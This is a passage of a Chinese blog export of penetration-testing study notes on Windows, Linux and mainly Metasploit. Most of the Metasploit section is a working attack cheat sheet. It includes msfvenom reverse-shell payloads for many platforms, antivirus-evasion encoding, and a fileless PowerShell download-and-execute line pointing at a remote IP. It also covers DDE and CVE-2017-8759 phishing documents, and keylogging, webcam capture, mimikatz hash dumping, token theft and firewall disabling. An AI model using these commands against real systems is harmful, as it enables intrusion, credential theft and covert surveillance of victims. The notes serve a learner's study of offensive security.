短文件利用： a. 像apache在windows上搭建，如果后台地址是admin_151351834，那么输入admin~1可以自动补全 b. sqlmap --sql-shell load_file(&#x27;d:/wwwroot/index.php&#x27;);查看源代码寻找地址，前提有管理员权限 CDN绕过CDN是内容分发网络，是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。即在不同区域放置缓存服务器以避免一台服务器负荷来达到加速的效果。 判断： 1使用站长工具超级ping，查看各地ping的ip是否一致 寻找真实ip： 1234a. 查看子域名ipb. 敏感文件泄露c. 历史ip判断（ip138）d. 让服务器主动发包（邮件），一般邮件服务器和网站服务器在一个服务器上 绕过cdn访问：修改hosts文件 其他1234567891011121314151617181920212223242526非web服务的网络服务攻击方式：1. 密码破解（爆破）2. 漏洞利用（像溢出漏洞，用已经有的exp秒）3. ddos攻击，使服务器瘫痪4. 欺骗5. 钓鱼（配合社工）拿到一台内网服务器作为跳板机：1. web提权2. 邮件钓鱼3. 社工4. 木马（植入客服）目标对象分析：1. 单个目标服务器（非web）2. web服务器3. 整个网络拓扑：a. 内网b. 外网一般流程：1. 收集目标信息2. 对目标进行分析3. 通过各种漏洞实施攻击，进行入侵4. 留后门，方便下次进入5. 抹去痕迹，清理入侵记录","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"渗透测试/信息收集","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"渗透测试学习基础","slug":"渗透测试学习笔记（基础篇）","date":"2024-02-26T02:25:19.097Z","updated":"2022-04-08T17:06:05.750Z","comments":true,"path":"2024/02/26/渗透测试学习笔记（基础篇）/","permalink":"http://example.com/2024/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/","excerpt":"","text":"渗透测试学习笔记（基础篇）一.系统目录、服务、端口、注册表 系统目录 windows 12345系统安装目录，存放系统文件资料Windows/system32：系统配置文件，命令，粘滞键（sethc.exe）Windows/system32/config/SAM：记录用户密码信息的文件 用pe清空密码，或者pe复制密码，搞完再把密码换回去Windows/system32/drivers/etc/hosts：优先域名解析，破解，翻墙 program files 12Program files：程序默认安装文件夹（提权需要知道位数）Program files（x86）：代表32位应用程序 用户 12用户目录，登陆过会有记录，尽量不要创建账号，会被溯源登录管理员账号访问桌面，比在文件夹看到的多 perflogs (存放日志记录（但不是系统日志，系统日志在windows里面）) Program Data：系统临时生成的文件数据，病毒喜欢的文件夹（默认是隐藏的） 服务（services.msc） 服务是一种应用程序类型，它在后台运行。 服务应用程序通常可以在本地和通过网络为用户提供一些功能，例如客户端&#x2F;服务器应用程序、Web服务器、数据库服务器以及其他基于服务器的应用程序。 查看计算机本地服务 常见的服务 12web，dns（域名解析），dhcp（分发ip），ftp（上传下载），smb（文件共享），telnet（远程登录），rdp（远程桌面——3389 操作服务的命令： net start&#x2F;stop + 服务 关掉安全狗：sc config “safedog” start&#x3D;disable（开机服务禁用），然后重启 端口(区分服务) 端口的作用是用来区分服务 端口不可以重复使用 端口范围是从1-65535（1-1024分给了系统自带的一些服务，木马病毒一般使用高位端口。） ![image-20220212164602289](C:\\Users\\86157\\Documents\\Tencent Files\\16778738\\FileRecv\\安全笔记\\image-20220212164602289.png) 常见段口 1234567891011121.HTTP协议代理服务器常用端口号：80/8080/3128/8081/90802.FTP（文件传输）协议代理服务器常用端口号：213.Telnet（远程登录）协议代理服务器常用端口：234.TFTP（Trivial File Transfer Protocol ），默认的端口号为69/udp；5.SSH（安全登录）、SCP（文件传输）、端口重定向，默认的端口号为22/tcp；6.SMTP Simple Mail Transfer Protocol (E-mail)，默认的端口号为25/tcp（木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口）；7.POP3 Post Office Protocol (E-mail) ，默认的端口号为110/tcp；8.TOMCAT，默认的端口号为8080；9.WIN2003远程登陆，默认的端口号为3389；10.Oracle 数据库，默认的端口号为1521；11.MS SQL*SERVER数据库server，默认的端口号为1433/tcp 1433/udp；12.QQ，默认的端口号为1080/udp 注册表（regedit） 设置开机启动项 克隆账号密码权限 读取服务密码 隐藏后门 权限维持 注册表结构 12345678910111.HKEY_CLASSES_ROOT 管理文件系统。根据在Windows 中安装的应用程序的扩展名,该根键指明其文件类型的名称，相应打开该文件所要调用的程序等等信息。2.HKEY_CURRENT_USER 管理系统当前的用户信息。在这个根键中保存了本地计算机中存放的当前登录的用户信息,包括用户登录用户名和暂存的密码。在用 户登录Windows 98时，其信息从HKEY_USERS中相应的项拷贝到HKEY_CURRENT_USER中。3.HKEY_LOCAL_MACHINE 管理当前系统硬件配置。在根键这个中保存了本地计算机硬件配置数据,此根键下的子关键字包括在SYSTEM.DAT中,用来提供HKEY_LOCAL_MACHINE所需的信息,或者在远程计算机中可访问的一组键中。这个根键里面的许多子键与System.ini文件中设置项类似。4.HKEY_USERS 管理系统的用户信息。在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表。同时每个用户的预配置信息都存储在HKEY_USERS根键中。HKEY_USERS是远程计算机中访问的根键之一。5.HKEY_CURRENT_CONFIG 管理当前用户的系统配置。在这个根键中保存着定义当前用户桌面配置(如显示器等等)的数据,该用户使用过的文档列表（MRU），应用程序配置和其他有关当前用户的Windows 98中文版的安装的信息。 二.常见Dos命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152531. ping：测试网络连接（TTL值一般是128或64，然后每经过一个路由器-1，一般最多经过32跳）2. tracert：查看经过的路由器（搞c段，判断是不是在一个机房）3. ipconfig：查看网卡信息 a. ipconfig /release：释放ip b. ipconfig /renew：重新获取 c. ipconfig /all：查看详细信息4. systeminfo：查看补丁信息（提权必备）5. arp -a：查看arp缓存表，查看其他主机mac地址6. shutdown -s：关机 a. -t：设置时间，单位为s b. -c：弹框，在“”中输入要写的东西 c. -a：取消 d. -r：重启7. dir：查看当前目录（.是隐藏目录）8. cd：目录移动 a. cd 文件名：移动到所写文件名 b. cd.. ：移动到上一级目录 c. cd c: cd d: ：移动到c/d盘9. md：创建目录，后面跟文件名10. rd：删除目录，后面跟文件名11. copy con xxx.txt：创建文件，后跟路径，默认当前路径，可以改后缀，然后写内容，ctrl+z，回车，创建。12. start：启动文件，后跟文件名，也可以跟url13. type xxx.txt：命令行查看内容14. del xxx.txt：删除文件15. rm /S：递归删除文件夹16. copy：复制文件，后跟原文件路径及目标路径17. move：移动，同上（同级目录移动等于改名）18. cls：清屏19. net start：查看服务20. net stop：关闭服务（有空格的服务用双引号引起来）21. netstat -tanlp：查看端口信息22. net user：查看用户 a. net user 1 1 /add：创建用户 b. net user 1$ 1 /add：创建用户 c. net user 1 1 /del：删除用户 d. net user 用户：查看详细信息23. net localgroup administrator：查看管理员组24. net localgroup administrators 1 /add：添加管理员25. tasklist：查看进程26. taskkill /im xxx.exe /f：结束进程27. echo &quot;123&quot; &gt; 123.txt：写入文件28. query user：查看管理员在不在，登录信息29. msg admin &quot;hello&quot;：弹框，聊天30. net use k: \\\\ 192.168.1.11\\c$ （磁盘映射，走smb协议，win10默认关闭）31. net use k: \\del 断开32. net share c$ /del：删除c盘共享 net share 查看本地开启的共享 net share ipc$ 开启ipc$共享 net share ipc$ /del 删除ipc$共享 33. whoami：查看身份34. hostname：计算机名称35. wmic product get name,version：查看当前安装程序36. 批处理（.bat）：dos命令组合文件，写在里面的命令会被逐一执行 12345678910111213net config workstation 查看当前登录域cmdkey /l 查看远程连接历史记录net user /domain 查看域内用户信息net user xx /domain 查看xx域用户详细信息net user /domain xx 123123 修改域用户密码net group &quot;domain admins&quot; /domain 获取域管理列表net group &quot;domain controllers&quot; /domain 获取域控net localgroup administrators cracer\\cc /add 将域用户cc添加到本地管理员组net view /domain 查看内网多少个域net view /domain:cracer 查看cracer域中的机器列表","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"渗透测试/后渗透","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"Windows","slug":"渗透测试/后渗透/Windows","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/Windows/"},{"name":"Linux","slug":"渗透测试/后渗透/Windows/Linux","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/Windows/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"后渗透","permalink":"http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"metasploit学习笔记","slug":"渗透测试学习笔记（metasploit）","date":"2024-02-26T02:25:19.095Z","updated":"2022-04-08T17:05:10.509Z","comments":true,"path":"2024/02/26/渗透测试学习笔记（metasploit）/","permalink":"http://example.com/2024/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88metasploit%EF%BC%89/","excerpt":"","text":"METASPLOITexploit-db •Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。 12345678910渗透攻击（exploit）测试者利用系统，程序，或服务的漏洞进行攻击的一个过程。攻击载荷（payload）攻击者在目标系统上执行的一段攻击代码，该代码具有返弹连接，创建用户，执行其他系统命令的功能shellcode在目标机器上运行的一段机器指令，成功执行后会返回一个shell模块（module）是指Metasploit框架中所使用的一段软件代码组件。监听器（listener）监听器是metasploit中用来等待介入网络连接的组件。 启动设置 12345678910111213service postgresql startservice metasploit startmsfconsole进入后输入db_status 查看数据库连接状态workspace -a test 创一个工作台删除 -d 选项 进入test工作台Wordspace test使用nmapdb_nmap -sS 192.168.80.1 扫描主机db_export 1.xml 导出扫描结果db_import 1.xml 导入扫描结果hosts 查看扫描结果 信息收集12345678910111213141516171819202122232425262728293031①whois查询：msf &gt; whois example.com②http://searchdns.netcraft.com/在线收集服务器 IP信息工具③nslookupmsf&gt; db_nmap –sS –A192.168.1.111msf&gt; db_services #查看扫描结果msf&gt; search portscanmsf&gt; use auxiliary/scanner/postscan/synsmb_version 模块：msf&gt; use auxiliary/scanner/smb/smb_version找 mssql 主机：msf&gt; use auxiliary/scanner/mssql/mssql_pingSSH 服务器扫描：msf&gt; use auxiliary/scanner/ssh/ssh_versionTelnet服务器扫描msf&gt; use auxiliary/scanner/telnet/telnet_versionFTP 主机扫描：msf&gt; use auxiliary/scanner/ftp/ftp_versionFTP 匿名登录：useauxiliary/scanner/ftp/anonymos扫描局域网内有哪些主机存活useauxiliary/scanner/discovery/arp_sweep扫描网站目录auxiliary/scanner/http/dir_scanner搜索网站中的E-mail地址search_email_collectoruse auxiliary/gather/search_email_collector嗅探抓包msf&gt; use auxiliary/sniffer/psnuffle msf密码破解模块123456789101112131415ssh服务口令猜测use auxiliary/scanner/ssh/ssh_loginmysql口令攻击search mysqluse auxiliary/scanner/mysql/mysql_loginpostgresql攻击search postgresqluse auxiliary/scanner/postgres/postgres_logintomcat 攻击search tomcatuse auxiliary/scanner/http/tomcat_mgr_logintelnet 攻击use auxiliary/scanner/telnet/telnet_loginsamba攻击use auxiliary/scanner/smb/smb_login msf漏洞利用模块12345678910111213141516171819202122常用漏洞利用命令search &lt;name&gt; 用指定关键字搜索可利用漏洞use &lt;exploit name&gt; 使用漏洞show options 显示选项set &lt;OPTION NAME&gt; &lt;option&gt; 设置选项show payloads 显示装置show targets 显示目标(os版本)set TARGET &lt;target number&gt; 设置目标版本exploit 开始漏洞攻击sessions -l 列出会话sessions -i &lt;ID&gt; 选择会话sessions -k &lt;ID&gt; 结束会话&lt;ctrl&gt; z 把会话放到后台&lt;ctrl&gt; c 结束会话show auxiliary 显示辅助模块use &lt;auxiliary name&gt; 使用辅助模块set &lt;OPTION NAME&gt; &lt;option&gt; 设置选项run 运行模块 word钓鱼 web_delivery MSF PAYLOAD模块•msfvenom是msfpayload和msfencode的结合体，于2015年6月8日取代了msfpayload和msfencode。在此之后，metasploit-framework下面的的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）都不再被支持。 payload参数： 12345678910111213a. -p：指定payload，一般用 windows/meterpreter/reverse_tcp 比较多b. -e：指定要用的编码器，一般用 shikata_ga_nai ，其他的都不太好用c. -i：指定编码次数，后面跟数字，如：-i 8d. -b：设定规避字符集，指定需要过滤的坏字符，如：&#x27;\\x0f&#x27;、&#x27;\\x00&#x27;e. -f：指定输出格式，如：-f exef. -o：指定生成文件存放位置，也可用&gt;代替g. -l：列出指定模块的所有可用资源h. -a：指定payload的目标架构，如x86，x64，x86_64，默认为32位程序i. -s：设定payload的最大长度，即文件大小j. --platform：指定payload的目标平台，如windows，linuxk. 其余参数可用 -h 查看例子：msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;IP&gt;lport=&lt;port&gt; -f exe -o payload.exe 建立监听123456789101112131415161. 常规监听 msfconsole：进入msf控制台 use exploit/multi/handler：使用模块 set payload windows/meterpreter/reverse_tcp：设置payload set lhost &lt;ip&gt;：设置要侦听的ip set lport &lt;port&gt;：设置要侦听的端口 options：查看设置详情） run或exploit2. 快速监听：默认持续侦听 msfconsole：进入msf控制台 handler -H &lt;ip&gt; -P &lt;port&gt; -p &lt;payload&gt;3. 其他 exploit -j -z：后台持续监听，-j是后台任务，-z是持续监听，使用jobs查看和管理 jobs -K可结束所有任务。 sessions -l：查看我的会话 sessions -i 1：调用我的1号会话 123456789payload可持续化： 因为生成木马反弹payload后容易被杀死，而手动迁移进程的migrate有一个操作间隔，所以可以在生成payload时就加上进程迁移，即生成木马时加上：PrependMigrate=true PrependMigrateProc=svchost.exemsfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=1122 -e x86/shikata_ga_nai -b &quot;\\x00&quot; -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o shell.exe 各种平台payload生成12345678910111213Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT=1122 -a x86 --platform Linux -f elf &gt; shell.elfWindows msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=1122 -f exe &gt; shell.exeMac msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoAndroid msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST= LPORT=1122 -f raw &gt; shell.apk msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT=1122 R &gt; test.apk安卓免杀 rat yutube 12345678查看windows/meterpreter/reverse_tcp支持什么平台、哪些选项，可以使用msfvenom -p windows/meterpreter/reverse_tcp --list-optionsmsfvenom --list payloads可查看所有payloadsmsfvenom --list encoders可查看所有编码器评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器类似可用msfvenom --list命令查看的还有payloads, encoders, nops, platforms, archs, encrypt, formats 生成payload123456789101112131415161718Powershell msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST= LPORT=1122 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1Netcatnc正向连接 msfvenom -p windows/shell_hidden_bind_tcp LHOST= LPORT=1122 -f exe&gt; 1.exenc反向连接，监听 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=1122 -f exe&gt; 1.exePHPmsfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.phpASPmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSPmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspWARmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war powershell msf无文件攻击powershell 必须加&#x2F;x64&#x2F; 1234567891011121314151617上面生成的木马都是要发送到服务器运行才行，有落地文件，会有痕迹，如果想建立会话的同时不想在服务器留文件，可以用无文件攻击，通过命令远程加载代码到内存运行，一旦重启无法溯源。具体操作：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=148.28.27.106 lhost=1234 -f psh-reflection &gt; x.ps1（这一步生成ps脚本文件）启用vps，搭建网站，把文件放在网站目录里，通过对外部文件的访问来http://149.28.27.106/x.ps1进行调用，如vps的ip为192.168.8.1建立侦听在目标机的命令行输入：powershell IEX (New-Object Net.Webclient).DownloadString(&#x27;http://149.28.27.106/x.ps1&#x27;)，运行进行调用，如vps的ip为192.168.8.1建立侦听在目标机的命令行输入：powershell IEX (New-Object Net.Webclient).DownloadString(&#x27;http://149.28.27.106/x.ps1&#x27;)，运行建立连接 WORD钓鱼12新建word设置域，DDEAUTO C:\\\\windows\\\\system32\\\\cmd.exe &quot;/k powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.8.1/x.ps1&#x27;) msf使用宏钓鱼12345678910git clone https://github.com/bhdresh/CVE-2017-8759.gitpython cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.80.132/logo.txtmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.80.132 LPORT=1133 -f exe &gt; /root/shell.exe捆绑后开80端口 netstat -tnlppython cve-2017-8759_toolkit.py -M exp -e http://192.168.80.132/shell.exe -l /root/shell.exe开启监听模块，发送给目标运行钓鱼文件，等代上线 msf制作excle钓鱼web_delivery 1234567use exploit/multi/script/web_deliveryset target 2 target regsvr32 windows/64/meterpreter/reverse_tcpset payload windows/meterpreter/reverse_tcpset LHOST 192.168.3.143set URIPATH /exploit powershell -w hidden -nop IEX (New-ObjectNet.Webclient).DownloadString(‘http://192.168.8.1/x.ps1‘) ngrok转发•本机安装客户端 •.&#x2F;sunny clientid id号 Msf5-Evasion模块免杀123show evasionhttp://virustotal.com/ 验证静态免杀 bypass shellter免杀•shellcode代码注入工具 •https://www.shellterproject.com/download/ py免杀123456789生产py文件的payloadmsfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.8.124 -i 11 -f py -o msf.py 建立侦听将生成的py文件修改处理下载pyinstall：https://nchc.dl.sourceforge.net/project/pyinstaller/2.0/pyinstaller-2.0.zip解压安装安装pywin32pip.exe install pywin32python.exe pyinstaller-2.0\\pyinstaller.py --console --onefile pyinstaller-2.0\\11.py venom免杀paylaod123456下载地址：https://github.com/r00t-3xp10it/venomsudo ./setup.sh运行sudo ./venom.sh Meterpreter后渗透模块1Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。 权限，使用平台，环境 基础命令12345678910111213141516171819202122232425262728293031323334353637383940进程迁移migrate关闭杀软 ——失效—— run killav 通过服务关闭通过其 shell 来关闭防火墙netsh adcfirewall set allprofiles state off查看目标机所有流量run packetrecorder -i 1提取系统信息run scraperps 查看进程migrate 1774 切换进程截屏 screenshot获取系统运行的平台 sysinfocat c:\\boot.ini#查看文件内容,文件必须存在del c:\\boot.ini #删除指定的文件upload /root/Desktop/netcat.exe c:\\ # 上传文件到目标机主上，如upload setup.exe C:\\\\windows\\\\system32\\download nimeia.txt /root/Desktop/ # 下载文件到本机上如：download C:\\\\boot.ini /root/edit c:\\boot.ini # 编辑文件getwd#打印工作目录cd#更改本地目录ls#列出在当前目录中的文件列表pwd#输出工作目录cd c:\\\\ #进入目录文件下rm file #删除文件mkdir dier #在受害者系统上的创建目录rmdir#受害者系统上删除目录dir#列出目标主机的文件和文件夹信息mv#修改目标主机上的文件名search -d d:\\\\www -f web.config #search 文件，如search -d c:\\\\ -f *.docrun vnc 查看桌面 修改vnc配置run getgui -e 开启目标主机远程桌面sysinfo 命令为显示远程主机的系统信息execute -f notepad.exeexecute -h 显示帮助信息。-f为执行要运行的命令如果希望隐藏后台执行，加参数-Hexecute -H -f notepad.exe 摄像头命令1234567record_mic #音频录制webcam_chat #查看摄像头接口webcam_list #查看摄像头列表webcam_stream #摄像头视频获取 端口转发（不需要高权限，正常会话权限）12345678910111213portfwd -h用法：portfwd [-h] [add | delete | list | flush] [args]选项： -L &lt;opt&gt;要监听的本地主机（可选） -h帮助横幅 -l &lt;opt&gt;要监听的本地端口 -p &lt;opt&gt;连接到的远程端口 -r &lt;opt&gt;要连接到的远程主机portfwd add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发,本机监听4444,把目标机3389转到本机4444rdesktop -u Administrator -p bk#123 127.0.0.1:4444 #使用rdesktop来连接桌面，-u 用户名 -p 密码rdesktop 127.1.1.0:4444 #需要输入用户名和密码远程连接 键盘记录1234keyscan_start：开启键盘记录功能keyscan_dump：显示捕捉到的键盘记录信息keyscan_stop：停止键盘记录 HASH获取12345678910111213meterpreter &gt; load mimikatz #加载mimikatz --kiwi--meterpreter &gt; msv #获取hash值meterpreter &gt; kerberos #获取明文（system权限）meterpreter &gt;ssp #获取明文信息meterpreter &gt; wdigest #获取系统账户信meterpreter &gt;mimikatz_command -f a:: #必须要以错误的模块来让正确的模块显示meterpreter &gt;mimikatz_command -f hash:: #获取目标 hashmeterpreter &gt; mimikatz_command -f samdump::hashesmeterpreter &gt; mimikatz_command -f sekurlsa::searchParun post/windows/gather/smart_hashdumpwin7 有uac控制 嗅探123456789101112use sniffer # 加载嗅探模块sniffer_interfaces #列出目标主机所有开放的网络接口sniffer_start 2 #获取正在实施嗅探网络接口的统计数据sniffer_dump 2 /tmp/test2.cap #在目标主机上针对特定范围的数据包缓冲区启动嗅探sniffer_stop 2 #停止嗅探对抓取的包进行解包：use auxiliary/sniffer/psnuffleset pcapfile 1.caprunwireshark，加载这个/tmp/xpsp1.cap 也可 盗取令牌1234meterpreter &gt;use incognito 加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)meterpreter &gt;list_tokens -u 列出目标主机用户的可用令牌meterpreter &gt;list_tokens -g 列出目标主机用户组的可用令牌meterpreter &gt;impersonate_token DOMAIN_NAME\\\\USERNAME 假冒目标主机上的可用令牌,如meterpreter &gt; impersonate_token QLWEB\\\\Administrato 持久控制服务器123456789101112注册表，服务后门，计划任务，​ 360，火绒绕过​ cs 调用powershell 无文件攻击 web_deliveryrookit（linux）","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"渗透测试/后渗透","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"msf","slug":"渗透测试/后渗透/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/"},{"name":"免杀","slug":"渗透测试/后渗透/msf/免杀","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/%E5%85%8D%E6%9D%80/"}],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"},{"name":"后渗透","slug":"后渗透","permalink":"http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"}]},{"title":"Linux操作学习","slug":"渗透测试学习笔记(Linux基础篇)","date":"2024-02-26T02:25:19.094Z","updated":"2022-04-08T17:03:18.176Z","comments":true,"path":"2024/02/26/渗透测试学习笔记(Linux基础篇)/","permalink":"http://example.com/2024/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(Linux%E5%9F%BA%E7%A1%80%E7%AF%87)/","excerpt":"","text":"Linux基础操作学习exploit-db.com：内核漏洞发布网站 内核版本：XX.YY.ZZ（XX代表主版本号，YY代表次版本号，ZZ代表补丁次数） 次版本号奇数代表开发版，偶数代表稳定版 Linux系统目录结构： root：管理员家目录 bin：存放二进制可执行文件（ls，cat等），即存放普通命令 sbin：存放管理员执行的系统命令 boot：存放用于系统引导时的各种文件 dev：存放设备文件，磁盘硬盘等 etc：存放系统管理和配置文件 home：用户家目录，相当于windows用户目录、 var：放日志文件，网站根目录 lib：存放库文件 用于存放系统应用程序，最庞大的目录，要用到的应用程序和文件几乎都在这里 media，mnt：挂载光驱、光盘目录 lost+found：平常是空的，系统非正常关机而无家可归的文件在这里 proc：系统开机后临时生成的文件 srv：存放一些服务 tmp：用于存放各种临时文件，是公用的临时文件存储点，有源代码编译权限 opt：存放外部程序 selinux：服务防火墙 sys：存放系统文件 二、Linux常用命令1.文件操作类 1234567891011121314151617181920212223242526272829303132333435363738394041a. pwd：查看当前路径b. cd 目录：转到目录 cd .. ：返回上一级目录 cd - ：后退c. du -sh：统计文件大小d. ls：查看文件，文件夹 -l：长格式显示详细信息 -a：显示所有子目录和文件信息，包括隐藏文件 -d：显示目录本身属性 -R：递归显示内容 -h：以更易读的方式（K,M等）显示大小e. chomd （39:50）这里看视频更方便一些 权限：r读（4），w写（2），x执行（1），d表示为文件夹 用户：u所有者，g用户分组，o其他人，a所有人 chomd g+x 1.txt：对1.txt的用户组添加可执行权限（g-x即为去除权限） chomd 777 a.txt：所有权限设置为可读可写可执行 chown test:test a.jpg：改变所有者和用户组 搭建网站时：chown -R apache:apache /var/www/html 递归缩小权限f. touch：创建文件或更新文件时间标记g. mkdir：创建目录 -p创建递归目录h. cp：复制文件或目录 -r递归复制 -f强制覆盖 -p保持源文件属性不变i. rm：删除文件或目录 -r递归 -f强制j. mv：移动文件或目录k. wc：统计文件中出现的单词数量，字节数量和行数l. cat：查看文件内容find：查找文件或目录 格式：find [查找范围] [查找条件] -name：按文件名查找 -size：按文件大小查找 -user：按文件属性查找 -type：按文件类型查找m.压缩命令gzip：gzip [文件] [压缩文件名].gz gzip -d xxx.gz 解压缩 bzip2：bizp2 [文件] [压缩文件名].bz2 解压缩同上n.打包命令tar tar -cvf x.tar 1 2 3 把1,2,3文件打包为x.tar，可以再配合压缩 tar -xvf x.tar 解包 tar -tvf x.tar 查看包里文件 tar -rvf x.tar 4 把4追加到x.tar中 tar -jxvf x.tar.bz2 bz2下一步解压所有文件 tar -zxvf x.tar.bz2 gzip下一步解压所有文件 2.系统操作命令 1234567891011121314151617a. uname -r：查看系统内核版本，-a查看完整信息b. hostname：查看主机名（后加名称可更改）c. ifconfig：查看网卡ip信息（dhclient eth0：获取网卡ip）d. cat /proc/cupinfo：查看系统cpu信息cat /proc/meminfo：查看系统内存信息e. reboot：重启f. Halt：关机 用户账户命令（1:10:30） 创建用户：useradd [用户] 删除用户：userdel -r [用户] -r表示连用户宿主目录一并删除 etc/passwd：存放系统账号 linux查看管理员是看uid和pid号，0为管理员h. ps -aux：查看系统进程 top：动态查看进程 q退出 kill：杀死进程netstat -tnlp：查看本地开放端口信息netstat -an：查看与外部连接情况详细信息 1234LAMP平台：Linux+Apache+Mysql+PHPLNMP平台：Linux+Nginx+Mysql+PHPWAMP平台：Winodws+Apache+Mysql+PHPWNMP平台：Winodws+Nginx+Mysql+PHP 